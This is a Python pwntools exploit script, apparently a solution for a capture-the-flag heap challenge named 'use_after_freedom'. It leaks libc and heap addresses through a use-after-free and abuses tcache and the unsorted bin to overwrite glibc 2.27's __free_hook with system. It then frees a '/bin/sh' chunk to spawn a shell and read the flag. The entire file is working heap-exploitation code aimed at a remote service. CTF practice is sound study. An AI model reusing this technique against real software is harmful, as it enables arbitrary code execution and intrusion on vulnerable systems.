#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'use-after-freedom.hsc.tf', 1337
binary = './use_after_freedom'
brkpts = '''
tel $rebase(0x202010)
'''

elf = ELF("use_after_freedom")
libc = ELF("libc-2.27.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.27.so'})

def choice(idx):
    sla("\n> ", str(idx))

def add(size, name):
    choice(1)
    choice(size)
    choice(name)

def free(idx):
    choice(2)
    choice(idx)

def edit(idx, name):
    choice(3)
    choice(idx)
    choice(name)

def view(idx):
    choice(4)
    choice(idx)

def exploit(io):
    add(0x420, "a")
    add(0x8, "b")
    free(0)
    view(0)

    libc.address = uu64(re(6)) - 0x3ebca0
    log.info("libc -> "+hex(libc.address))
    free_hook = libc.symbols['__free_hook']
    malloc_hook = libc.symbols['__malloc_hook']
    system = libc.symbols['system']
    arena = libc.address + 0x3ebca0

    gadget = libc.address + 0xe546f

    free(1)
    edit(1, p64(0)*2)
    free(1)
    view(1)

    heap = uu64(re(6)) - 0x690
    log.info("heap -> "+hex(heap))

    #new_addr = (heap & 0xffffff000000) + 0x756001#0x404001
    new_addr = heap - 0x244000 + 1

    edit(0, p64(arena) + p64(new_addr))

    gdb.attach(io, brkpts)

    add(0x420, "c")

    edit(1, p64(free_hook))

    add(0x10, "/bin/sh\x00")
    add(0x10, p64(system))

    free(3)
    #io.interactive()

if __name__ == "__main__":
    while True:
        try:
            #io = remote(remote_ip, port)
            io = process(binary, env = {'LD_PRELOAD' : './libc-2.27.so'})

            exploit(io)

            io.sendline("cat flag*")
            print(io.recv())
            io.interactive()

        except:
            io.close()
            continue